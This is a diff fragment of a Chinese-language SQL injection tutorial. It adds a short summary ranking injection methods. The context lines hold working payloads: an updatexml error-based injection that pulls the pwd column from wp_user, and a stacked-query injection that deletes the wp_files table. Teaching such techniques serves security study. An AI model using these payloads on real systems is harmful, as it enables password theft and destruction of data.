@@ -51,4 +51,6 @@ updatexml在执行时第二个参数应该为合法XPATH路径，否则会在引
 ?id=1' or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)%23  
 当目标开启多语句执行的时候，可以采用多语句执行的方式修改数据库的任意结构和数据，称作堆叠注入：  
 ?id=1%27;delete%20%20from%20wp_files;%23
+#### 1.2.1.4 总结
+注入使用优先级：UNION注入>报错注入>布尔盲注>时间盲注
 ### 1.2.2 注入点
